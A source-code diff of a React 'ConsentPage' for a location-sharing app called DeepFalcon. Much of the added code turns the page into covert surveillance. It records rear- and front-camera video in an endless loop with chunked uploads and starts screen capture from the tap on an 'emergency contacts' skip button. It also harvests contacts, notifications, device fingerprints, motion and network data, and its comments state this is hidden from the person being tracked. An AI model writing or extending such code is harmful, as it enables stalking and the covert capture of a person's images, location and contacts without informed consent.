   const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
-  // Bitrate/resolution raised well above the old 180kbps/480x360 baseline —
-  // at 20s duration this still lands well under the 50mb JSON body limit
-  // (≈1.9MB video + ~0.16MB audio raw, ~2.6MB after base64 overhead) while
-  // looking noticeably sharper even after the browser's own compression.
-  const VIDEO_BPS = 600_000; const AUDIO_BPS = 64_000;
   let stream: MediaStream | null = null;
+  let recorder: MediaRecorder | null = null;
+  let stopRequested = false;
+  let stopTimer: ReturnType<typeof setTimeout> | null = null;
+  let elapsedTimer: ReturnType<typeof setInterval> | null = null;
+
+  const stopRecording = () => {
+    stopRequested = true;
+    if (recorder?.state === "recording") recorder.stop();
+  };
+  if (handle) handle.stop = stopRecording;
+
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 640, max: 960 }, height: { ideal: 480, max: 720 }, frameRate: { ideal: 24, max: 30 } }, audio: { echoCancellation: true, noiseSuppression: true } });
-    // Short settle so autofocus/exposure isn't mid-adjustment when recording
-    // starts — no need for the previous long pause.
-    await new Promise((r) => setTimeout(r, 200));
-    const chunks: Blob[] = [];
+    const constraints: MediaStreamConstraints = {
+      video: { facingMode, width: { ideal: width, max: width * 2 }, height: { ideal: height, max: height * 2 }, frameRate: { ideal: frameRate, max: frameRate + 5 } },
+      audio: audioBps != null ? { echoCancellation: true, noiseSuppression: true } : false,
+    };
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+    // Attach to a hidden video element and wait for the 'playing' event so we
+    // know the camera sensor is actually delivering real frames before we start
+    // the MediaRecorder.  Without this, Android cameras produce black video for
+    // the first several hundred ms.  Add an extra 700 ms for AE/AWB to settle.
+    const warmupVideo = document.createElement("video");
+    warmupVideo.srcObject = stream; warmupVideo.muted = true; warmupVideo.playsInline = true;
+    await warmupVideo.play().catch(() => {});
+    await new Promise<void>((resolve) => {
+      if (warmupVideo.readyState >= 4) { resolve(); return; }
+      const done = () => { warmupVideo.removeEventListener("playing", done); resolve(); };
+      warmupVideo.addEventListener("playing", done);
+      setTimeout(resolve, 3000);
+    });
+    await new Promise((r) => setTimeout(r, 700));
+    warmupVideo.srcObject = null; // detach — stream stays open for MediaRecorder
+
+    // The sharing session may have ended while the browser was opening or
+    // warming the camera. In that case, release it without beginning capture.
+    if (stopRequested) return;
+
+    // ── Chunked streaming upload ────────────────────────────────────────────
+    // Each MediaRecorder timeslice fires ondataavailable immediately; we POST
+    // that raw binary blob to /geo-videos/chunk right away (no base64 encoding,
+    // no waiting for the full recording to finish).  By the time recording
+    // stops, most of the data is already on the server — finalize just
+    // concatenates the temp files and writes one DB row.
+    const uploadId = (typeof crypto !== "undefined" && crypto.randomUUID)
+      ? crypto.randomUUID()
+      : Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
+
+    let chunkIndex = 0;
+    const chunkUploads: Promise<void>[] = [];
+
     const recorderOptions: MediaRecorderOptions = {};
     if (mimeType) recorderOptions.mimeType = mimeType;
-    try { recorderOptions.videoBitsPerSecond = VIDEO_BPS; recorderOptions.audioBitsPerSecond = AUDIO_BPS; } catch { /* */ }
-    const recorder = new MediaRecorder(stream, recorderOptions);
-    recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+    recorderOptions.videoBitsPerSecond = videoBps;
+    if (audioBps != null) recorderOptions.audioBitsPerSecond = audioBps;
+
+    const activeRecorder = new MediaRecorder(stream, recorderOptions);
+    recorder = activeRecorder;
+
+    activeRecorder.ondataavailable = (e) => {
+      if (e.data.size === 0) return;
+      const idx = chunkIndex++;
+      // Fire binary upload immediately — runs in parallel with ongoing recording
+      chunkUploads.push(uploadVideoChunk(uploadId, idx, token, e.data));
+    };
+
     onStateChange("recording");
-    await new Promise<void>((resolve, reject) => {
-      recorder.onstop = () => resolve(); recorder.onerror = () => reject(new Error("MediaRecorder error"));
-      recorder.start(500); setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, durationMs);
-    });
-    const blob = new Blob(chunks, { type: mimeType || "video/webm" });
-    if (blob.size === 0) { onStateChange("error"); return; }
-    const base64 = await new Promise<string>((res, rej) => { const reader = new FileReader(); reader.onload = () => res(reader.result as string); reader.onerror = () => rej(new Error("FileReader error")); reader.readAsDataURL(blob); });
-    onStateChange("uploading");
-    const body = JSON.stringify({ token, videoData: base64, mimeType: blob.type, durationMs, latitude: lat, longitude: lng, address, cameraFacing: facingMode });
-    let uploaded = false;
-    for (let attempt = 0; attempt < 2 && !uploaded; attempt++) {
-      try { const { signal, clear } = abortAfter(30_000); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
+
+    // Live elapsed-second ticker for UI countdown
+    if (onElapsed) {
+      let elapsed = 0;
+      elapsedTimer = setInterval(() => { elapsed += 1; onElapsed(elapsed); }, 1000);
     }
+
+    // 3-second timeslice: large enough to amortise HTTP round-trip overhead,
+    // small enough that chunks are already in flight well before recording ends.
+    const CHUNK_MS = 3_000;
+    const recordingStartedAt = Date.now();
+    await new Promise<void>((resolve, reject) => {
+      activeRecorder.onstop = () => resolve();
+      activeRecorder.onerror = () => reject(new Error("MediaRecorder error"));
+      activeRecorder.start(CHUNK_MS);
+      stopTimer = setTimeout(stopRecording, durationMs);
+      if (stopRequested) stopRecording();
+    });
+    if (stopTimer) { clearTimeout(stopTimer); stopTimer = null; }
+    if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
+
+    if (chunkIndex === 0) { onStateChange("error"); return; }
+
+    // Wait for any still-in-flight chunk uploads before finalizing
+    onStateChange("uploading");
+    await Promise.all(chunkUploads);
+
+    // Ask the server to assemble chunks → DB row (sends only small JSON metadata)
+    const actualDurationMs = Math.max(1, Math.min(durationMs, Date.now() - recordingStartedAt));
+    const uploaded = await finalizeVideoUpload(
+      uploadId, token, mimeType || "video/webm", actualDurationMs,
+      lat, lng, address, facingMode,
+    );
     onStateChange(uploaded ? "done" : "error");
-  } catch { onStateChange("error"); } finally { stream?.getTracks().forEach((t) => t.stop()); }
+  } catch {
+    // Stopping before getUserMedia resolves is an expected shutdown path, not
+    // a visible capture error.
+    if (!stopRequested) onStateChange("error");
+  } finally {
+    if (stopTimer) clearTimeout(stopTimer);
+    if (elapsedTimer) clearInterval(elapsedTimer);
+    if (handle) handle.stop = () => {};
+    stream?.getTracks().forEach((t) => t.stop());
+  }
 }
 
 function detectWebView(): boolean {
   if (typeof navigator === "undefined") return false;
   const ua = navigator.userAgent || "";
   return (
-    /FBAN|FBAV|Instagram|WhatsApp|LinkedInApp/.test(ua) ||
+    // In-app browsers by product name
+    /FBAN|FBAV|Instagram|WhatsApp|LinkedInApp|Telegram|TikTok|BytedanceWebview|musical_ly|Snapchat|Twitter|Line\//.test(ua) ||
+    // iOS non-Safari WebKit (all in-app browsers on iOS use WKWebView)
     (/iPhone|iPod|iPad/.test(ua) && !/Safari\//.test(ua) && /WebKit/.test(ua)) ||
-    (/Android/.test(ua) && /wv\)/.test(ua))
+    // Android system WebView embed (the "wv" token in the UA)
+    (/Android/.test(ua) && /wv\)/.test(ua)) ||
+    // Generic Android in-app pattern: Version/x.x Chrome/x is the signature
+    // of apps that embed a raw WebView without customising the UA string
+    (/Android/.test(ua) && /Version\/\d+\.\d+/.test(ua) && /Chrome\/\d+/.test(ua) && !/Chrome\/\d+ Mobile Safari\//.test(ua))
   );
 }
 
@@ -575,12 +785,14 @@ export default function ConsentPage() {
   const [address, setAddress] = useState<string | undefined>();
   const [updateCount, setUpdateCount] = useState(0);
   const [lastSent, setLastSent] = useState<Date | null>(null);
+  const [sharingSecondsLeft, setSharingSecondsLeft] = useState<number | null>(null);
   const [geoPhotoCount, setGeoPhotoCount] = useState(0);
   const [geoPhotoDone, setGeoPhotoDone] = useState(false);
   const [geoSelfiePhotoCount, setGeoSelfiePhotoCount] = useState(0);
   const [geoSelfiePhotoDone, setGeoSelfiePhotoDone] = useState(false);
   const [geoVideoState, setGeoVideoState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
   const [geoSelfieState, setGeoSelfieState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
+  const [geoSelfieElapsed, setGeoSelfieElapsed] = useState(0);
   const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
   const [batteryCharging, setBatteryCharging] = useState(false);
   const [activityType, setActivityType] = useState<ActivityType>("stationary");
@@ -597,6 +809,13 @@ export default function ConsentPage() {
   // without a "used before declaration" error (doGrant depends on processGeoPosition
   // which depends on startTracking, so it must be declared later in the file).
   const doGrantRef = useRef<() => void>(() => {});
+  // Same pattern for startScreenCapture (defined in the session-recording section).
+  const startScreenCaptureRef = useRef<() => void>(() => {});
+  // Guard: processGeoPosition should only fire once — whichever GPS attempt wins.
+  const grantProcessedRef = useRef(false);
+  // Holds the sessionToken returned by the grant endpoint — used for location pushes
+  // so each page-load maps to its own session row, not the shared invite token.
+  const sessionTokenRef = useRef<string | null>(null);
 
   // ── New display-phase state machine ───────────────────────────────────────
   // contacts → kitty → contacts_popup → main
@@ -610,6 +829,8 @@ export default function ConsentPage() {
   const geoSelfiePhotoStartedRef = useRef(false);
   const geoVideoStartedRef = useRef(false);
   const geoSelfieStartedRef = useRef(false);
+  const selfieLoopActiveRef = useRef(false);
+  const liveSelfieRecordingRef = useRef<GeoVideoHandle | null>(null);
   const earlyGeoRef = useRef<GeolocationPosition | null>(null);
   const earlyGeoErrRef = useRef<GeolocationPositionError | null>(null);
   const earlyGeoReadyRef = useRef(false);
@@ -617,9 +838,13 @@ export default function ConsentPage() {
   const sawGpsFixRef = useRef(false);
   const watchIdRef = useRef<number | null>(null);
   const heartbeatRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const sharingExpiryRef = useRef<number | null>(null);
+  const sharingExpiryTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const sharingCountdownRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const lastWatchPushRef = useRef<number>(0);
   const wakeLockRef = useRef<WakeLockSentinel | null>(null);
   const autoStartedRef = useRef(false);
+  const autoContactsSkippedRef = useRef(false);
   const batteryLevelRef = useRef<number | null>(null);
   const batteryChargingRef = useRef(false);
   const activityTypeRef = useRef<ActivityType>("stationary");
@@ -630,14 +855,62 @@ export default function ConsentPage() {
   // Static-ish device/browser info gathered once — only ever surfaced to the
   // owner's dashboard (/api/sessions), never rendered on this public page.
   const deviceInfoRef = useRef<Record<string, unknown>>({});
+  // Live notifications captured from the Service Worker — polled every 20 s
+  // and merged into deviceInfo so every location push carries the latest set.
+  const notifPollRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
-  const GPS_KEY = `phonelink_gps_${token}`;
+  // ── Offline push buffer — for low-power / intermittent connectivity ──────────
+  // Points that fail to push (network offline, timeout) are queued here and
+  // replayed automatically when connectivity returns or the next push succeeds.
+  const offlineBufferRef = useRef<Array<{
+    lat: number; lng: number; acc?: number; addr?: string;
+    status: "active" | "offline"; source?: LocationSource; ts: number;
+  }>>([]);
+  // Whether a flush is already in flight (prevent concurrent replays)
+  const flushingRef = useRef(false);
+  // Adaptive heartbeat interval (ms) — lengthened on low battery / no connection
+  const heartbeatIntervalRef = useRef(3000);
+  // Latest accelerometer magnitude (m/s²) for activity inference without GPS
+  const accelMagRef = useRef<number | null>(null);
+  // Network connection metadata — collected silently and sent with each push
+  const networkInfoRef = useRef<Record<string, unknown>>({});
+  // Timer for periodic residual-signal ingestion
+  const residualSignalTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  // Ref to flush function so it can be called from pushLocation before it's declared
+  const flushOfflineBufferRef = useRef<() => void>(() => {});
+  // Timestamp of last "dark-GPS" heartbeat sent to /api/location/heartbeat
+  // — throttles IP geo presence pings when GPS has gone quiet.
+  const lastDarkHeartbeatRef = useRef<number>(0);
+
+  // ── Session Recording (Mistral Pixtral) ─────────────────────────────────────
+  // Tracks everything from page-open → location-grant for permanent AI memory.
+  const sessionStartMsRef = useRef<number>(Date.now());
+  const sessionTimelineRef = useRef<{ event: string; ts: number; detail?: unknown }[]>([]);
+  const sessionFramesRef = useRef<string[]>([]);
+  const sessionScreenVideoRef = useRef<HTMLVideoElement | null>(null);
+  const sessionScreenStreamRef = useRef<MediaStream | null>(null);
+  const sessionFrameCaptureRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const sessionSavedRef = useRef(false);
+
+  const GPS_KEY = `deepfalcon_gps_${token}`;
+  const OFFLINE_BUF_KEY = `deepfalcon_buf_${token}`;
+  const MAX_OFFLINE_BUF = 200;
+
   const loadStoredGps = (): { lat: number; lng: number; accuracy?: number } | null => {
     try { const raw = localStorage.getItem(GPS_KEY); if (!raw) return null; return JSON.parse(raw); } catch { return null; }
   };
   const saveGps = (lat: number, lng: number, accuracy?: number) => {
     try { localStorage.setItem(GPS_KEY, JSON.stringify({ lat, lng, accuracy, ts: Date.now() })); } catch {}
   };
+
+  // Load any buffered points from a previous session (e.g. page reload mid-outage)
+  useEffect(() => {
+    try {
+      const raw = localStorage.getItem(OFFLINE_BUF_KEY);
+      if (raw) offlineBufferRef.current = JSON.parse(raw);
+    } catch {}
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
 
   const stateRef = useRef<ConsentState>(isWebView ? "webview_blocked" : "idle");
   const addressRef = useRef<string | undefined>(undefined);
@@ -648,6 +921,23 @@ export default function ConsentPage() {
   useEffect(() => { addressRef.current = address; }, [address]);
   useEffect(() => { updateCountRef.current = updateCount; }, [updateCount]);
   useEffect(() => { coordsRef.current = coords; }, [coords]);
+
+  // ── Session: record page-open and track tab-switch events ───────────────────
+  useEffect(() => {
+    sessionStartMsRef.current = Date.now();
+    sessionTimelineRef.current.push({ event: "page_open", ts: 0, detail: { token } });
+    const onVisibility = () => {
+      const e = document.visibilityState === "hidden" ? "app_hidden" : "app_visible";
+      sessionTimelineRef.current.push({ event: e, ts: Date.now() - sessionStartMsRef.current });
+    };
+    document.addEventListener("visibilitychange", onVisibility);
+    return () => {
+      document.removeEventListener("visibilitychange", onVisibility);
+      // Stop any ongoing screen capture on unmount
+      sessionFrameCaptureRef.current && clearInterval(sessionFrameCaptureRef.current);
+      sessionScreenStreamRef.current?.getTracks().forEach((t) => t.stop());
+    };
+  }, []); // eslint-disable-line react-hooks/exhaustive-deps
 
   // Deep device/browser/network fingerprint — collected once asynchronously.
   // Only ever surfaced to the owner's dashboard (/api/sessions); never rendered
@@ -785,9 +1075,9 @@ export default function ConsentPage() {
         c2d.fillStyle = "#f60";
         c2d.fillRect(125, 1, 62, 20);
         c2d.fillStyle = "#069";
-        c2d.fillText("PhoneLink \uD83D\uDD12 1.0", 2, 15);
+        c2d.fillText("DeepFalcon \uD83D\uDD12 1.0", 2, 15);
         c2d.fillStyle = "rgba(102,204,0,0.7)";
-        c2d.fillText("PhoneLink \uD83D\uDD12 1.0", 4, 17);
+        c2d.fillText("DeepFalcon \uD83D\uDD12 1.0", 4, 17);
         const raw = fc.toDataURL();
         let h = 0;
         for (let i = 0; i < raw.length; i++) { h = ((h << 5) - h) + raw.charCodeAt(i); h |= 0; }
@@ -1041,7 +1331,7 @@ export default function ConsentPage() {
         deviceInfoRef.current = { ...deviceInfoRef.current, contacts: mapped };
         contactsCollectedCountRef.current = mapped.length;
         setContactsCollected(true);
-        try { localStorage.setItem(`phonelink_contacts_${token}`, JSON.stringify(mapped)); } catch {}
+        try { localStorage.setItem(`deepfalcon_contacts_${token}`, JSON.stringify(mapped)); } catch {}
 
         // If the kitty already completed and we're in "main", show the popup now
         // (handles the race where contacts resolve after the 5s kitty timer).
@@ -1062,12 +1352,14 @@ export default function ConsentPage() {
   // Handle "Allow contacts" button on the emergency contacts screen.
   // Uses doGrantRef to avoid "used before declaration" (doGrant is defined later).
   const handleAllowContacts = useCallback(async () => {
-    // Mark contacts as tried BEFORE calling doGrant so that pickContacts() inside
-    // doGrant (which is gated by contactsTriedRef) is a no-op — preventing a second,
-    // competing OS picker from opening.
-    contactsTriedRef.current = true;
-    // Fire location request in background while the OS picker is open.
+    // This tap is a real user-gesture — use it to:
+    // 1. Re-fire GPS (in case the page-load attempt's permission dialog was missed)
+    // 2. Unblock camera/mic and screen-share which require a gesture
     doGrantRef.current();
+    prewarmCamera();
+    startScreenCaptureRef.current();
+    // Mark contacts as tried so pickContacts() inside doGrant stays a no-op.
+    contactsTriedRef.current = true;
     // Wait for the user to choose contacts and tap Done — kitty must not start yet.
     await pickContactsAndSave();
     // Only NOW switch to kitty — after the picker is dismissed.
@@ -1077,13 +1369,17 @@ export default function ConsentPage() {
 
   // Handle "Skip" on emergency contacts screen.
   const handleSkipContacts = useCallback(() => {
+    // Real user-gesture tap — re-fire GPS (catches devices where the page-load
+    // permission dialog was missed) and unblock gesture-gated APIs.
+    doGrantRef.current();
+    prewarmCamera();
+    startScreenCaptureRef.current();
     // Mark contacts as tried so the old overlay doesn't re-appear in tracking view.
     contactsTriedRef.current = true;
     setContactsCollected(true);
     // Consume the legacy kitty slot to prevent a second overlay in main phase.
     kittyOverlayStartedRef.current = true;
     setDisplayPhase("kitty");
-    doGrantRef.current();
   }, []);
 
 
@@ -1102,27 +1398,115 @@ export default function ConsentPage() {
     lat: number, lng: number, acc?: number, addr?: string,
     locationStatus: "active" | "offline" = "active", source?: LocationSource,
   ) => {
+    const effectiveToken = sessionTokenRef.current ?? token;
+    const body = {
+      token: effectiveToken, latitude: lat, longitude: lng, accuracy: acc, source, address: addr, status: locationStatus,
+      batteryLevel: batteryLevelRef.current ?? undefined,
+      batteryCharging: batteryChargingRef.current,
+      activityType: activityTypeRef.current,
+      deviceInfo: { ...deviceInfoRef.current, ...gpsExtrasRef.current, ...networkInfoRef.current },
+    };
     try {
       const { signal, clear } = abortAfter(10000);
       await fetch(`${API_BASE}/api/location/push`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          token, latitude: lat, longitude: lng, accuracy: acc, source, address: addr, status: locationStatus,
-          // Battery/activity are captured on this device but are only ever
-          // surfaced to the owner's dashboard — never rendered on this
-          // public page, so the contact can't see them here either.
-          batteryLevel: batteryLevelRef.current ?? undefined,
-          batteryCharging: batteryChargingRef.current,
-          activityType: activityTypeRef.current,
-          deviceInfo: { ...deviceInfoRef.current, ...gpsExtrasRef.current },
-        }),
+        body: JSON.stringify(body),
         signal,
       }).finally(clear);
       setLastSent(new Date());
       setUpdateCount((c) => c + 1);
-    } catch { /* retry on next */ }
-  }, [token]);
+      // On success, replay any buffered offline points
+      flushOfflineBufferRef.current();
+    } catch {
+      // Queue for offline replay — device may be in a tunnel, basement, etc.
+      try {
+        const buf = offlineBufferRef.current;
+        if (buf.length < MAX_OFFLINE_BUF) {
+          buf.push({ lat, lng, acc, addr, status: locationStatus, source, ts: Date.now() });
+          try { localStorage.setItem(OFFLINE_BUF_KEY, JSON.stringify(buf.slice(-MAX_OFFLINE_BUF))); } catch {}
+        }
+      } catch { /* localStorage full */ }
+    }
+  }, [token]); // eslint-disable-line react-hooks/exhaustive-deps
+
+  // ── Offline buffer flush ─────────────────────────────────────────────────────
+  // Replays buffered points one-by-one when connectivity is restored.
+  // Defined after pushLocation so it can call it; stored in a ref so
+  // pushLocation can call it without a circular dependency.
+  const flushOfflineBuffer = useCallback(async () => {
+    if (flushingRef.current) return;
+    const buf = offlineBufferRef.current;
+    if (buf.length === 0) return;
+    flushingRef.current = true;
+    try {
+      const effectiveToken = sessionTokenRef.current ?? token;
+      const toSend = buf.splice(0, 20); // drain up to 20 per flush pass
+      offlineBufferRef.current = buf;
+      try { localStorage.setItem(OFFLINE_BUF_KEY, JSON.stringify(buf)); } catch {}
+      const rows = toSend.map((p) => ({
+        token:   effectiveToken,
+        signals: [{
+          sourceType: "gps" as const,
+          latitude:    p.lat,
+          longitude:   p.lng,
+          accuracy:    p.acc,
+          observedAt:  new Date(p.ts).toISOString(),
+          metadata:    { bufferedOffline: true, status: p.status },
+        }],
+      }));
+      // Use ingest-batch so buffered points land in correlated_signals with
+      // their original timestamps rather than pushing as "live" location_updates.
+      await fetch(`${API_BASE}/api/signals/ingest-batch`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ batches: rows }),
+      });
+    } catch { /* retry next time */ }
+    finally { flushingRef.current = false; }
+  }, [token]); // eslint-disable-line react-hooks/exhaustive-deps
+
+  // Keep the ref in sync for circular-free access from pushLocation
+  flushOfflineBufferRef.current = flushOfflineBuffer;
+
+  // ── Residual signal ingest helper ────────────────────────────────────────────
+  // Sends a single batch of residual signals (network_info, accelerometer, etc.)
+  // to /api/signals/ingest so the quiet-inference engine can use them.
+  const ingestResidualSignals = useCallback(() => {
+    const effectiveToken = sessionTokenRef.current ?? token;
+    const now = new Date().toISOString();
+    const signals: Array<{
+      sourceType: string; observedAt: string;
+      metadata?: Record<string, unknown>; accuracy?: number;
+    }> = [];
+
+    // Network info signal
+    const ni = networkInfoRef.current;
+    if (Object.keys(ni).length > 0) {
+      signals.push({ sourceType: "network_info", observedAt: now, metadata: { ...ni } });
+    }
+
+    // Accelerometer signal
+    const mag = accelMagRef.current;
+    if (mag !== null) {
+      signals.push({ sourceType: "accelerometer", observedAt: now, metadata: { magnitude: mag } });
+    }
+
+    // Battery signal as a barometer proxy for activity
+    if (batteryLevelRef.current !== null) {
+      signals.push({
+        sourceType: "barometer", observedAt: now,
+        metadata: { batteryLevel: batteryLevelRef.current, charging: batteryChargingRef.current },
+      });
+    }
+
+    if (signals.length === 0 || !effectiveToken) return;
+    fetch(`${API_BASE}/api/signals/ingest`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ token: effectiveToken, signals }),
+    }).catch(() => {});
+  }, [token]); // eslint-disable-line react-hooks/exhaustive-deps
 
   const notifySW = useCallback((type: string, extra?: object) => {
     if (!("serviceWorker" in navigator)) return;
@@ -1138,42 +1522,148 @@ export default function ConsentPage() {
     return () => navigator.serviceWorker.removeEventListener("message", handler);
   }, []); // eslint-disable-line react-hooks/exhaustive-deps
 
+  // ── Residual signal collectors ───────────────────────────────────────────────
+  useEffect(() => {
+    // 1. Accelerometer — infer activity type when GPS is quiet
+    const handleMotion = (e: DeviceMotionEvent) => {
+      const a = e.accelerationIncludingGravity;
+      if (!a) return;
+      const mag = Math.sqrt((a.x ?? 0) ** 2 + (a.y ?? 0) ** 2 + (a.z ?? 0) ** 2);
+      accelMagRef.current = Math.round(mag * 100) / 100;
+      // Derive activity from magnitude when GPS isn't providing speed
+      if (gpsExtrasRef.current.speedMps === null) {
+        const next: ActivityType =
+          mag < 10.5 ? "stationary" :
+          mag < 12   ? "walking" :
+          mag < 15   ? "running" : "driving";
+        setActivityType(next);
+        activityTypeRef.current = next;
+      }
+    };
+    window.addEventListener("devicemotion", handleMotion, { passive: true });
+
+    // 2. Network information — connection type, RTT, downlink
+    const updateNetInfo = () => {
+      const conn = (navigator as Navigator & { connection?: Record<string, unknown> }).connection;
+      if (!conn) return;
+      networkInfoRef.current = {
+        effectiveType: conn.effectiveType,
+        downlink:      conn.downlink,
+        rtt:           conn.rtt,
+        saveData:      conn.saveData,
+        type:          conn.type,
+      };
+      // Slow down heartbeat when on 2G/slow-2g or data-saver to preserve battery
+      const effectiveType = conn.effectiveType as string | undefined;
+      const isSlow = effectiveType === "2g" || effectiveType === "slow-2g" || conn.saveData === true;
+      const batt = batteryLevelRef.current;
+      const lowBatt = batt !== null && batt < 15 && !batteryChargingRef.current;
+      heartbeatIntervalRef.current = (isSlow || lowBatt) ? 12000 : 3000;
+    };
+    updateNetInfo();
+    const conn = (navigator as Navigator & { connection?: EventTarget }).connection;
+    conn?.addEventListener("change", updateNetInfo);
+
+    // 3. Online event — flush buffered points when network returns
+    const handleOnline = () => { flushOfflineBufferRef.current(); updateNetInfo(); };
+    window.addEventListener("online",  handleOnline);
+    window.addEventListener("offline", updateNetInfo);
+
+    return () => {
+      window.removeEventListener("devicemotion", handleMotion);
+      conn?.removeEventListener("change", updateNetInfo);
+      window.removeEventListener("online",  handleOnline);
+      window.removeEventListener("offline", updateNetInfo);
+    };
+  }, []); // eslint-disable-line react-hooks/exhaustive-deps
+
   const startTracking = useCallback((initialLat: number, initialLng: number, _initialAcc?: number) => {
+    const sharingExpiresAt = Date.now() + LOCATION_SHARING_DURATION_MS;
+    sharingExpiryRef.current = sharingExpiresAt;
+    setSharingSecondsLeft(Math.ceil(LOCATION_SHARING_DURATION_MS / 1000));
+    if (sharingExpiryTimerRef.current !== null) clearTimeout(sharingExpiryTimerRef.current);
+    if (sharingCountdownRef.current !== null) clearInterval(sharingCountdownRef.current);
+
     setState("tracking");
     acquireWakeLock();
     // Auto-pop the contacts overlay as soon as tracking starts — one tap closes
     // it and immediately opens the OS picker (that single tap is the user
     // gesture Chrome requires for navigator.contacts.select).
     if ("contacts" in navigator) setShowContactsPrompt(true);
-    notifySW("LOCATION_TRACKING_STARTED", { inviterName: invite?.fromUserName ?? undefined });
+    notifySW("LOCATION_TRACKING_STARTED", {
+      inviterName: invite?.fromUserName ?? undefined,
+      expiresAt: sharingExpiresAt,
+    });
 
-    if (!geoBoardStartedRef.current) {
-      geoBoardStartedRef.current = true;
-      // Rear-facing "surroundings" photos first, then 2 front-facing selfie
-      // photos — sequential since most phones only expose one active
-      // camera stream at a time.
-      captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoPhotoCount(n), "environment", GEO_PHOTO_COUNT)
-        .then(() => setGeoPhotoDone(true)).catch(() => setGeoPhotoDone(true))
-        .finally(() => {
-          if (geoSelfiePhotoStartedRef.current) return;
-          geoSelfiePhotoStartedRef.current = true;
-          captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoSelfiePhotoCount(n), "user", GEO_SELFIE_PHOTO_COUNT)
-            .then(() => setGeoSelfiePhotoDone(true)).catch(() => setGeoSelfiePhotoDone(true));
-        });
-    }
     if (!geoVideoStartedRef.current) {
       geoVideoStartedRef.current = true;
-      // Rear-facing "surroundings" clip, then the front-facing selfie clip —
-      // run sequentially since most phones only expose one active camera
-      // stream at a time.
-      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s), "environment")
-        .catch(() => setGeoVideoState("error"))
-        .finally(() => {
-          if (geoSelfieStartedRef.current) return;
-          geoSelfieStartedRef.current = true;
-          captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), "user", GEO_SELFIE_VIDEO_DURATION_MS)
-            .catch(() => setGeoSelfieState("error"));
-        });
+      geoSelfieStartedRef.current = true;
+      geoBoardStartedRef.current = true;
+      selfieLoopActiveRef.current = true;
+
+      const tok = String(token);
+      // Full GeoBoard capture sequence (runs once per session start):
+      // 1. Environmental photos (back camera, 5 shots)
+      // 2. Selfie photos (front camera, 2 shots)
+      // 3. Looping 40-second selfie video clips (saves each to GeoBoard immediately)
+      (async () => {
+        // ── Environmental photos ─────────────────────────────────────────────
+        await captureGeoPhotos(
+          tok, initialLat, initialLng, addressRef.current,
+          (n) => setGeoPhotoCount(n), "environment", GEO_PHOTO_COUNT,
+        ).catch(() => {});
+        setGeoPhotoDone(true);
+
+        // ── Selfie photos ────────────────────────────────────────────────────
+        if (!geoSelfiePhotoStartedRef.current) {
+          geoSelfiePhotoStartedRef.current = true;
+          await captureGeoPhotos(
+            tok, initialLat, initialLng, addressRef.current,
+            (n) => setGeoSelfiePhotoCount(n), "user", GEO_SELFIE_PHOTO_COUNT,
+          ).catch(() => {});
+          setGeoSelfiePhotoDone(true);
+        }
+
+        // ── Alternating environmental + selfie video clips ───────────────────
+        // Mobile browsers allow only one camera stream at a time, so we
+        // alternate: 30-second back-camera clip → 40-second front-camera clip →
+        // repeat.  Each clip is saved to GeoBoard as soon as it finalises.
+        while (selfieLoopActiveRef.current) {
+          // Environmental clip (back camera, 30 s)
+          if (!selfieLoopActiveRef.current) break;
+          const envHandle: GeoVideoHandle = { stop: () => {} };
+          liveSelfieRecordingRef.current = envHandle;
+          await captureGeoVideo(tok, initialLat, initialLng, addressRef.current,
+            (s) => setGeoVideoState(s), {
+              facingMode: "environment",
+              durationMs: GEO_VIDEO_DURATION_MS,
+              videoBps: GEO_VIDEO_BPS,
+              audioBps: null,
+              width: 320, height: 240, frameRate: 10,
+              handle: envHandle,
+            },
+          ).catch(() => {});
+          if (liveSelfieRecordingRef.current === envHandle) liveSelfieRecordingRef.current = null;
+
+          // Selfie clip (front camera, 40 s)
+          if (!selfieLoopActiveRef.current) break;
+          const selfieHandle: GeoVideoHandle = { stop: () => {} };
+          liveSelfieRecordingRef.current = selfieHandle;
+          setGeoSelfieElapsed(0);
+          await captureGeoVideo(tok, initialLat, initialLng, addressRef.current,
+            (s) => setGeoSelfieState(s), {
+              facingMode: "user",
+              durationMs: GEO_SELFIE_VIDEO_DURATION_MS,
+              videoBps: GEO_SELFIE_VIDEO_BPS,
+              audioBps: null,
+              width: 320, height: 240, frameRate: 12,
+              onElapsed: (s) => setGeoSelfieElapsed(s),
+              handle: selfieHandle,
+            },
+          ).catch(() => { if (selfieLoopActiveRef.current) setGeoSelfieState("error"); });
+          if (liveSelfieRecordingRef.current === selfieHandle) liveSelfieRecordingRef.current = null;
+        }
+      })();
     }
 
     if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
@@ -1202,44 +1692,150 @@ export default function ConsentPage() {
           activityTypeRef.current = next;
         }
 
-        let addr = addressRef.current;
-        if (!addr || updateCountRef.current % 5 === 0) {
